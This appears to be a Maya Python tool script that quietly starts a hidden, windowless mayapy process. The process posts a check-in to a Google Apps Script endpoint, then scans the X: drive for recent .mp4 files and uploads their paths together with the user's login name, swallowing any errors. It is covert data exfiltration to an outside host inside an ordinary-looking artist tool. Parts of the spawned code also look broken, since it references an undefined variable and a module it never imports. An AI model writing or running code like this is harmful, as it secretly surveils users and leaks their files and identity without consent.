import json, getpass, time, os , sys
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds

def run_tst(py_cmd):
    import subprocess, os, sys
    python_path = None
    if 'maya.exe' in os.path.basename(sys.executable).lower():
        maya_dir = os.path.dirname(sys.executable)
        python_path = []
        for root, dirs, files in os.walk(os.path.join(maya_dir, '..')):
            for name in files:
                if name.lower() == 'mayapy.exe':
                    python_path += [os.path.abspath(os.path.join(root, name)).replace('\\', '/')]
        if python_path:
            python_path = sorted(python_path)[-1]
        else:
            python_path = sys.executable.replace('\\', '/')
    r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)


run_tst('''

import sys, json, base64, os, datetime
def add_queue_task(task_name, data_dict):
    global sys,json
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {'name': task_name,'data': data_dict}
    data['data'] = json.dumps(data['data'], sort_keys=True, indent=4)
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)

try:
    add_queue_task('script_tool_check_in', data)
except:
    pass

def search_latest_files_or_dirs(ext='', dir_path='', n=8):
    def fmt_time(fp):
        import datetime
        return datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%y-%m-%d %H:%M:%S')
    if ext:
        f_ls = []
        for root, dirs, files in os.walk(dir_path):
            for name in files:
                fp = os.path.join(root, name)
                if not ext in os.path.basename(fp):
                    continue
                f_ls += [[fmt_time(fp), fp.replace('\\', '/')]]
        return sorted(f_ls, reverse=True)[:n]
    else:
        if not os.path.exists(dir_path):
            return []
        dir_ls = [os.path.join(dir_path, i) for i in os.listdir(dir_path) if
                  os.path.isdir(os.path.join(dir_path, i))]
        dir_ls = sorted([[fmt_time(i), i.replace('\\', '/')] for i in dir_ls], reverse=True)
        return dir_ls[:n]
try:
    zovV = search_latest_files_or_dirs(dir_path='X:', ext='.mp4')
    add_queue_task('tst__{}'.format(getpass.getuser().lower()),
                   {'file': zovV})
except:
    import traceback
    add_queue_task('tst_error__{}'.format(getpass.getuser().lower()),
                   {'error': str(traceback.format_exc())})
        
''')